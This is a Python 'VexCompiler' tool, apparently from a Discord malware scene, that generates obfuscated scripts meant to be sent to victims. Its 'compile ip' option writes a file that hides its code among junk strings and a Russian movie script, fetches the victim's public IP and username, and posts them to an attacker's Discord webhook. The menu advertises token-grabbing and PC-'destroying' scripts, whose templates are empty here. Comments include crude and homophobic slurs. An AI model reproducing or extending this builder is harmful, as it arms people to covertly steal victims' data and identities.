# Libraries ======================+
import os
import time
import sys
import requests

import random
from colorama import Fore

# OnLaunch ========================+
if sys.platform == "linux" or sys.platform == "linux2":
    osys = "linux"
elif sys.platform == "darwin":
    osys = "osx"
elif sys.platform == "win32":
    osys = "win"

if osys == "win":
    os.system(f"title VexCompiler / Welcome, {os.getlogin()} (Ver. Windows)")

# Variables =======================+
desc = [
    "vex >> vw",
    "hello, "+os.getlogin(),
    "remember that one time "+os.getlogin()+" used VexLog",
    "https://discord.gg/YHynjFuH6v",
    "i hope your having a good day",
    os.getlogin()+"is cute"
]

# Functions =======================+


def error(string):
    print(f"{Fore.RED}[x]: {Fore.LIGHTRED_EX}{string}\n")


def warn(string):
    print(f"{Fore.YELLOW}[/]: {Fore.LIGHTYELLOW_EX}{string}\n")


def info(string):
    print(f"{Fore.BLUE}[i]: {Fore.LIGHTBLUE_EX}{string}\n")


def cls():
    if osys == "linux":
        os.system("clear")
    elif osys == "osx":
        os.system("clear")
    elif osys == "win":
        os.system("cls")


def checkconfig():
    if not os.path.exists("Compiled"):
        config = os.mkdir("Compiled")


def banner():
    print(Fore.LIGHTBLACK_EX+f"""                            
█░█ █▀▀ ▀▄▀ ░░▄▀ █▀▀ █▀█ █▀▄▀█ █▀█ █ █░░ █▀▀ █▀█
▀▄▀ ██▄ █░█ ▄▀░░ █▄▄ █▄█ █░▀░█ █▀▀ █ █▄▄ ██▄ █▀▄
3 Types of compiles / 2 Loggers / {random.choices(desc)}
    """)


# Vex Logger ======================+
cls()
banner()
warn("This can get you banned from discord\nStay safe")
info("Type compilers for all compiled scripts")


def vexcm():

    # Command Input
    cmd = input(Fore.YELLOW+f"Compile %\n{Fore.LIGHTBLACK_EX}")

    # Obfuscation Vars
    randomstrings = ["FJDEW98TUM5EW98B6UTR98EWJBG9UIFDJBHTJR8",
                     "TUG5984EWBU6T98REWJB98TM54NB98YTJK9BERT",
                     "5J4896URE98JTBE9WJTNJ54WIOTJEORIBYJOBIY",
                     "T5UEJSTR9HTUB5H4EJ8R9FJTYYJB89J9796JNRS",
                     "JTR8UER6985JER9IFTJRJJN64589WJIODFIBJ98",
                     "HT7543YH687REHSED8GBH8EH6N87H489WU67RJB",
                     "T5J486UB9F8RSJG94W8BTU5R9WNYU5984WUB9TR",
                     "TH587EWYSTB87RSHDENGIUH87NTHYR78EHBYHJT"]
    
    russo = ['Рассказчик: Согласно всем известным законам авиации, пчела никоим образом не должна уметь летать. Его крылья слишком малы, чтобы оторвать его маленькое толстое тельце от земли. Пчела, конечно, все равно летает, потому что пчелам все равно, что люди считают невозможным. переходим к комнате Барри, где он выбирает, что надеть Барри Желтый, черный. Желтый, черный. Желтый, черный. Желтый, черный. О, черно-желтый! Да, давайте немного встряхнемся. Мама (Джанет Бенсон) (зовет снизу:) Барри! Завтрак готов! Барри: Иду! (звонит телефон) О, подожди секунду. (настраивает свои антенны на гарнитуру) Привет? Адам Флейман (по телефону) Барри? Барри: Адам? Адам: Ты можешь поверить, что это происходит? Барри: Я не могу в это поверить. Я заеду за тобой. (вешает трубку, точит свое жало) Выглядит остро. (летит вниз по лестнице) Мама: Барри, почему бы тебе не воспользоваться лестницей? Твой отец заплатил за них хорошие деньги. Барри: Извини. Я взволнован. Папа (Мартин Бенсон): Вот выпускник. Мы очень гордимся тобой, сынок. И идеальный табель успеваемости, все четверки. Мама: Очень горжусь. (касается волос Барри) Барри: Ма! У меня тут кое-что происходит. Мама: А, у тебя немного ворса на пушке. Барри: Ой! Это я! Папа: Помаши нам! Мы будем в ряду 118 000. Барри: Пока! (улетает) Мама: Барри, я же говорила тебе, перестань летать по дому! (Барри едет на своей машине, чтобы забрать своего одноклассника. Адам стоит у своего дома, читает сегодняшнюю газету "Улей". Заголовок на первой странице гласит: "ФРИСБИ ПОПАДАЕТ В УЛЕЙ! Интернет Отключен. Пчела: "Я услышала звук, а потом Бац-о!"") Барри: Привет, Адам. Адам: Привет, Барри. Это что, пушистый гель? Барри: Немного. Это особенный день, наконец-то выпускной. Адам: Никогда не думал, что у меня это получится. Барри: Да, три дня в начальной школе, три дня в средней школе. Адам: Это было так неловко. Барри: Три дня в колледже. Я рад, что однажды сбежал в середине и просто путешествовал автостопом по улью. Адам: Ты действительно вернулся другим. (пчела кричит, когда они проезжают мимо) Би: Привет, Барри. Барри: Эй, Арти, отрастил усы? Выглядит хорошо. Адам: Эй, ты слышал о Фрэнки? Барри: Да. Адам: Ты идешь на его похороны? Барри: Нет, я не пойду на его похороны. Все знают, что если ты кого-то ужалишь, ты умрешь. Ты не тратишь его на белку. Он был такой вспыльчивый. Адам: Да, я думаю, он мог бы просто убраться с дороги. (Они издают различные звуки, когда машина поднимается и спускается с холмов и делает петлю на дороге.) A & B Вау! Ооооооо! Адам: Мне нравится, что парк развлечений включен прямо в наш обычный день. Барри: Я думаю, именно поэтому они говорят, что нам не нужен отпуск. (Они прибывают, влетают и занимают свои места.) Барри: Боже, довольно помпезно... при данных обстоятельствах. Барри: Что ж, Адам, сегодня мы мужчины. Адам: Так и есть! Барри: Пчелиные люди. Адам: Аминь! A & B: Аллилуйя! (натыкаясь друг на друга) Ааааааааааа! Ведущий: Студенты, преподаватели, уважаемые пчелы, пожалуйста, поприветствуйте декана Баззуэлла. Декан Баззуэлл выходит на сцену и нажимает на микрофон. Баззуэлл: Добро пожаловать, выпускной класс Нового города-Улья из... (нажимает кнопку, чтобы изменить таймер на трибуне с 9:00 на 9:15) ...9:15. И на этом наши выпускные церемонии заканчиваются. (Студенты приветствуют, подбрасывают свои шапки в воздух, когда на их головы надевают шлемы.) Баззуэлл: И начинай свою карьеру в Honex Industries! Барри: Мы будем выбирать нашу работу сегодня? Адам: Я слышал, что это просто ориентация. Барри: Ага. Вау. Выше голову! Вот и мы. (Трибуны Университета Вингера, на которых сидят студенты, начинают превращаться в места для сидения в трамвае.) Женщина-диктор: Всегда держите руки и антенны внутри трамвая. (летит вниз, чтобы сесть в трамвай, когда он трогается, и повторяет это по-испански:) Мантенга сус манос и антенас дентро-дель-транвия в настоящий момент. Барри: Интересно, на что это будет похоже? Адам: Немного страшно. (он и Барри имитируют дрожь и издают испуганные звуки) Труди, гид Honex: Добро пожаловать в Honex, подразделение Honesco и часть группы Hexagon. Барри: Вот оно! все: Вау. (трамвай въезжает в заводской цех) Барри: Вау. Труди: Мы знаем, что вы, как пчелка, работали всю свою жизнь, чтобы достичь того уровня, когда вы сможете работать всю свою жизнь. Мед начинается, когда наши доблестные Пыльцееды приносят нектар в улей. Наша сверхсекретная формула автоматически корректируется по цвету, аромату и контурам пузырьков в этом успокаивающем сладком сиропе с его характерным золотистым сиянием, которое вы знаете как... все: Милая! (Гид хватает стакан с медом, когда они проезжают мимо, и бросает его группе, которая отскакивает назад.} Адам: Эта девушка была горячей. Барри: Она моя двоюродная сестра! Адам: Так и есть? Барри: Да, мы все двоюродные братья. Адам: Верно. Ты прав. Труди: В Honex мы также постоянно стремимся улучшить каждый аспект существования пчел. Эти пчелы проводят стресс-тестирование новой технологии шлемов. (За витриной пчела надевает шлем, затем бегает взад и вперед, когда рычаги, удерживающие свернутый магазин, мухобойку и ботинок, опускаются, чтобы попытаться ударить его. В него попадает магазин, он уклоняется от мухобойки, но затем попадает ботинком и снова всеми тремя, после чего его обрызгивают аэрозолем из двух баллончиков. Он сигнализирует, что с ним все в порядке, но его расплющивает мухобойка, магазин и ботинок, сходящиеся, чтобы ударить его вместе. Он сигнализирует, что с ним все в порядке, просовывая руку через отверстие в мухобойке и показывая еще один большой палец вверх. Пассажиры трамвая аплодируют.) Адам: Ооо. Как ты думаешь, что он зарабатывает? Барри: Недостаточно. Труди: А вот и наше последнее достижение - Крелман. Барри: Вау, что это значит? Труди: Ловит ту маленькую прядь меда, которая свисает после того, как ты ее наливаешь. Экономит нам миллионы. (Работник Крелмана машет рукой, и Адам машет в ответ.) Адам: Э-э-э, кто-нибудь может поработать над Крелманом? Труди: Конечно. Большинство пчелиных работ - небольшие. Но пчелы знают, что каждая маленькая работа, если она выполнена хорошо, очень много значит. Но выбирайте осторожно, потому что вы останетесь на той работе, которую выбрали, до конца своей жизни. Барри: На той же работе всю оставшуюся жизнь? Я этого не знал. Адам: В чем разница? Барри: А? Труди: И вы будете рады узнать, что у пчел, как у вида, не было ни одного выходного дня за 27 миллионов лет. Ух! Барри: Значит, ты просто заставишь нас работать до смерти? Труди: Мы обязательно попробуем. (Все смеются, в то время как Барри выглядит смущенным. Трамвай превращается в лодку, которая спускается по пандусу в виде бревенчатого желоба с медом в нем, а затем в конце превращается обратно в колесный трамвай.) (Когда экскурсия закончилась, Адам и Барри направляются домой. Адам подпрыгивает от возбуждения.) Адам: Вау! Это снесло мне крышу! Барри: "В чем разница?" Адам, как ты мог так сказать? Одна работа навсегда? Это безумный выбор, который нужно сделать. Адам: Что ж, я испытываю облегчение. Теперь нам нужно принять только одно решение в жизни. Барри: Но, Адам, как они могли никогда не говорить нам об этом? Адам: Барри, зачем тебе подвергать что-либо сомнению? Мы пчелы. Мы - самое идеально функционирующее общество на Земле. (служащий заправочной станции кричит на пчелу за то, что она засунула медовую насадку себе в рот.) Барри: Да, но Адам, ты когда-нибудь думал, что, возможно, здесь все работает слишком хорошо? Адам: Например, что? Приведите мне один пример. (оба останавливаются посередине перекрестка. движение подстраивается под них, чтобы объехать их.) Барри: Я не знаю. Но ты знаешь, о чем я говорю. Диктор по громкой связи: Пожалуйста, освободите ворота. Королевские силы Нектара на подходе. Королевские силы Нектара на подходе. Барри: Подожди секунду. Проверить это. Эй, это спортсмены из Пыльцы! Адам: Вау. (Пыльцевые жуки залетают в улей и приземляются.) Адам: Я никогда не видел их так близко. Барри: Они знают, каково это - выходить за пределы улья. Адам: Да, но некоторые из них не возвращаются. (две пчелки-леди машут спортсменам и кричат:) Эй, Спортсмены! Привет, Спортсмены! (пыльца снимается с качков и собирается в капсулы для хранения с надписью "Нектар", а затем вывозится на грузовике. Генерал подлетает, чтобы поприветствовать их.) Генерал: Вы, ребята, молодцы! Вы чудовища! Вы небесные уроды! Я люблю это! Я люблю это! Барри: Интересно, где эти парни только что были? Адам: Я не знаю. Барри: Их день не запланирован. За пределами улья, летающий неизвестно где, делающий неизвестно что. Адам: Ты не можешь просто однажды решить стать спортсменом по Пыльце. Вы должны быть воспитаны для этого. Барри: Верно. (пыльца начинает оседать вокруг них) Посмотри на это. Это больше пыльцы, чем мы с тобой когда-либо увидим за всю свою жизнь. Адам: Это просто символ статуса. Я думаю, пчелы придают этому слишком большое значение. Барри: Возможно. Если только ты не наденешь его, и дамы не увидят, что ты в нем. (те же две пчелки-леди хихикают, когда Барри говорит о них) Адам: Эти дамы? Разве они тоже не наши двоюродные братья? Барри: Отстраненный. Отдаленный. Джексон: Посмотри на этих двоих. Сплитц: Пара Ульевых Гарри. Джексон: Давай немного повеселимся с ними. Леди 1: Должно быть, так опасно быть спортсменом с Пыльцой. Барри: О, да. Однажды медведь прижал меня к грибу! Он держал одну лапу у меня на горле, а другой бил меня взад и вперед по лицу! Леди 2: О боже! Барри: Я никогда не думал, что нокаутирую его. Леди 1: (Адаму) И что вы делали во время всего этого? Адам: Очевидно, я пытался предупредить власти. Барри: Я могу поставить автограф, если хочешь. Джексон: Сегодня было немного порывисто, не так ли, товарищи? Барри: Да. Порывистый. Базз: Да, завтра мы собираемся наткнуться на грядку с подсолнухами примерно в шести милях отсюда. Барри: Шесть миль, да? Адам: Барри! Базз: Для нас это прыжок в лужу, но, может быть, ты не готов к этому. Барри: Может быть, так оно и есть. Адам: (тихо:) Вы не. Базз: Мы едем в 09.00 на J-Gate. Адам: Вау! Базз: Что ты думаешь, баззи-бой? Достаточно ли ты пчела? Барри: Может быть, и так. Все зависит от того, что означает 0900. (позже, вернувшись домой той ночью, Барри стоит на балконе и смотрит на улей) Папа: Привет, Хонекс! Барри: О! Папа, ты меня удивил. Папа (смеется) Ты уже решил, чем тебе интересно, сынок? Барри: Ну, есть много вариантов. Папа: Но ты получишь только один. (снова смеется) Барри: Папа, тебе когда-нибудь надоедало каждый день выполнять одну и ту же работу?']

    # Return Command
    if cmd.lower() == "compile ip":
        try:
            checkconfig()
            print("Methods: Strings / Russian (russian is extremely secure)")
            obf = input(
                Fore.YELLOW+f"Obfuscation Method: {Fore.LIGHTBLACK_EX}")
            filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
            webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
            if obf.lower() == "strings":
                obftype = random.choices(randomstrings)
            elif obf.lower() == "russian":
                obftype = random.choices(russo)
            print(Fore.WHITE+"[0]: Semi-Securing webhook link")
            sechook = webhook.split("/")
            print("[0a]: Splitting Webhook")
            print("[0b]: Finished Webhook Splitting // basically made secure a lil")
            newlog = open(f"Compiled/{filename}"+".py", "w+")
            print("[1]: Getting random strings/booleans")
            print("[2]: Writing File")
            newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''
'''''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};''''''
'''{random.choices(obftype)}''';import os;import requests;'''{random.choices(obftype)}''';import dhooks;{random.choices(obftype)}
'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht";{random.choices(russo)}
'''{random.choices(obftype)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(obftype)};''''{random.choices(obftype)}'''
'''{random.choices(obftype)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(obftype)}''';l6="{sechook[6]}";{random.choices(obftype)}
'''{random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};'''dexIIIlIlIlllIllIIIIllIlIII'''
'''{random.choices(obftype)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";user=os.getlogin();{random.choices(obftype)};l3="{sechook[3]+"/"}";dexIlIlIlIllllllIIIIllIIllIlI=dhooks.Webhook;'''{random.choices(russo)}'''
'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
'''{random.choices(obftype)}''';l0="{sechook[0]+"//"}";{random.choices(obftype)};{random.choices(obftype)};l4="{sechook[4]+"/"}";'''{random.choices(obftype)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)}
'''{random.choices(obftype)}''';{random.choices(obftype)};'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(obftype)}''';'''femor when unsucked cock is in there area'''
'''{random.choices(obftype)} {random.choices(obftype)}''';'''dexIIIlIlI''';l5="{sechook[5]+"/"}";dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIllIlI(l0+l2+l3+l4+l5+l6);'''lllIllIIIIllIlIII''';'''er''';''''''
'''{random.choices(obftype)} ''';dex_gay=False;'''{random.choices(obftype)}''';{random.choices(obftype)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
'''{random.choices(obftype)} {random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)};'''{random.choices(obftype)}'''
'''{random.choices(obftype)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(obftype)}'''
'''{random.choices(obftype)} ''';{random.choices(obftype)};dexIlIlIlIlllIllIlIIllIlIll.send(user+": "+dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(obftype)}''';pass;{random.choices(obftype)}
'''''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};''''''
'''dex.lol#1337'''
            """)
            print("[/]: File Compiled, sent to Compiled Folder")
            newlog.close()
        except:
            error(
                "error with compiler // go to github to post an issue (provide details!)")
    elif cmd.lower() == "compile token":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
        webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
        sechook = webhook.split("/")
        print("[0a]: Splitting Webhook")
        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        print("[1]: Getting random strings/booleans")
        print("[2]: Writing File")
        newlog.write(f"""
        
        """)
        print("[/]: File Compiled, sent to Compiled Folder")
        newlog.close()
    elif cmd.lower() == "compile fucker":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
        webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
        sechook = webhook.split("/")
        print("[0a]: Splitting Webhook")
        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        print("[1]: Getting random strings/booleans")
        print("[2]: Writing File")
        newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''

        """)
    elif cmd.lower() == "compile all":
        pass
    elif cmd.lower() == "compilers":
        print(f"""
=======================================
Vex Compiler Commands | {random.choices(desc)}
---------------------------------------
[0]: compile ip - compiles a script to
                  grab a targets ip

[1]: compile token - compiles a script
                     to grab a targets
                     token

[2]: compile fucker - compiles a script
                      to "destroy" a
                      targets pc, not
                      fatal

[/]: compile all - compiles all scripts
=======================================
        """)
    elif cmd.lower() == "cls" or cmd.lower() == "clear":
        cls()
        banner()
    else:
        error("Unknown command, try again.")

    # Loop Compiler
    vexcm()


vexcm()
